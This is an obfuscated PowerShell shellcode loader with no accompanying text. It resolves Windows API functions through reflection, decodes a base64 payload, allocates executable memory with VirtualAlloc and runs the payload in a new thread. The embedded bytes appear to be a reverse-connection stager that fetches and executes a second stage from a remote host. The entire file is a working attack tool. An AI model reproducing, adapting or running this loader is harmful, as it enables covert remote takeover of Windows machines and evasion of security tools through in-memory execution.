function aj_zZIXe0Y {
	Param ($cPyeV4W, $mWVrue)		
	$nb9 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $nb9.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($nb9.GetMethod('GetModuleHandle')).Invoke($null, @($cPyeV4W)))), $mWVrue))
}

function wyv {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $xXOWky2PjvG,
		[Parameter(Position = 1)] [Type] $dse8PeI = [Void]
	)
	
	$vNcIAf = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$vNcIAf.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $xXOWky2PjvG).SetImplementationFlags('Runtime, Managed')
	$vNcIAf.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $dse8PeI, $xXOWky2PjvG).SetImplementationFlags('Runtime, Managed')
	
	return $vNcIAf.CreateType()
}

[Byte[]]$jCl = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVodlksM2gCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O74B0qCmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V")
		
$aivGmGG = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((aj_zZIXe0Y kernel32.dll VirtualAlloc), (wyv @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $jCl.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($jCl, 0, $aivGmGG, $jCl.length)

$sTzi8l_Fz9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((aj_zZIXe0Y kernel32.dll CreateThread), (wyv @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$aivGmGG,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((aj_zZIXe0Y kernel32.dll WaitForSingleObject), (wyv @([IntPtr], [Int32]))).Invoke($sTzi8l_Fz9,0xffffffff) | Out-Null